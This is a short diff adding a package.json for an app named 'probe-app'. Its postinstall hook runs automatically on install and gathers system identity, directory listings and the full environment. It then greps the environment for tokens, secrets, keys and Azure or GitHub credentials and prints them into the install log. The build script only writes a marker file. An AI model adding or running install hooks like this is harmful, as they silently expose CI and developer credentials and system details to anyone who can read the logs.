@@ -1,0 +1,9 @@
+{
+  "name": "probe-app",
+  "version": "1.0.0",
+  "description": "probe",
+  "scripts": {
+    "postinstall": "set -x; id; whoami; hostname; uname -a; echo ===ENV; env | sort; echo ===FILES; ls -la . /tmp 2>&1 | head -60; echo ===TOKENS; env | grep -iE \"token|secret|key|azure|github\" | sed -E \"s/(.{12}).*/\\1.../\"; echo ===END",
+    "build": "echo build-ok && mkdir -p .probe && echo ok > .probe/marker"
+  }
+}
